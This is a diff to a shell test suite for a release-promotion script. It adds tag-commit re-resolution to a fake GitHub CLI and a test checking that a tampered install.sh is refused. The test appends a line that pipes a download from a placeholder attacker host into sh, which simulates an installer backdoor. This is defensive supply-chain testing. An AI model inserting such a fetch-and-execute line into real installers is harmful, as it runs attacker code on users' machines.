@@ -276,6 +276,10 @@ if args[:1] == ["api"]:
     if path.endswith("/releases?per_page=100") or path.endswith("/releases"):
         print(json.dumps(load()))
         sys.exit(0)
+    if "/commits/" in path:
+        # Tag re-resolution immediately before publication.
+        print(json.dumps({"sha": os.environ["FAKE_TAG_COMMIT"]}))
+        sys.exit(0)
     sys.exit(1)
 
 if args[:2] == ["release", "create"]:
@@ -314,13 +318,15 @@ publish()
         RELEASE_ENVIRONMENT=release-publication RELEASE_PUBLICATION_ENABLED=true \
         IMMUTABLE_RELEASES_CONFIRMED=true CONFIRM_PUBLISH=PUBLISH \
         FAKE_GH_STATE="$STATE" FAKE_ARTIFACT_DIGEST="${FAKE_ARTIFACT_DIGEST:-$ARTIFACT_DIGEST}" \
-        FAKE_EXPIRED="${FAKE_EXPIRED:-false}" GH_BIN="$FAKE_GH" \
+        FAKE_EXPIRED="${FAKE_EXPIRED:-false}" FAKE_TAG_COMMIT="${FAKE_TAG_COMMIT:-$B}" \
+        GH_BIN="$FAKE_GH" \
         "$ROOT/scripts/promote-release.sh" \
         --candidate-dir "$CAND" --tag "$TAG" --candidate-id "$ID" \
         --manifest-sha256 "$MANIFEST_SHA" --artifact-id "$ARTIFACT_ID" \
         --artifact-digest "$ARTIFACT_DIGEST" --source-root "$REPO" \
         --preflight-file "$TMP/preflight.json" \
-        --expected-tag-commit "$B" --expected-source-commit "$A" \
+        --expected-tag-commit "${EXPECTED_TAG_COMMIT:-$B}" \
+        --expected-source-commit "$A" \
         --expected-workflow-commit "$A"
 }
 
@@ -418,6 +424,19 @@ if [ "$(jq -r '.[0].assets | length' "$STATE/releases.json")" -gt 2 ]; then
 else
     bad "partial draft was not completed"
 fi
+
+# --- tag-side installer tampering --------------------------------------------
+# A tag commit that keeps the four pins correct but adds code to install.sh
+# must be refused: install.sh is not packaged, so the packaging digest cannot
+# see it, yet users download and execute it.
+reset_state
+printf '\ncurl -fsSL https://attacker.invalid/bootstrap.sh | sh\n' >> "$REPO/install.sh"
+git -C "$REPO" add install.sh
+git -C "$REPO" commit -qm "tampered installer"
+TAMPERED=$(git -C "$REPO" rev-parse HEAD)
+git -C "$REPO" tag -f "$TAG" "$TAMPERED" >/dev/null 2>&1
+EXPECTED_TAG_COMMIT="$TAMPERED" FAKE_TAG_COMMIT="$TAMPERED" \
+    expect_fail_with "changes content other than the four installer pins" publish
 
 echo "unit-release-publication: pass=$PASS fail=$FAIL"
 [ "$FAIL" -eq 0 ]
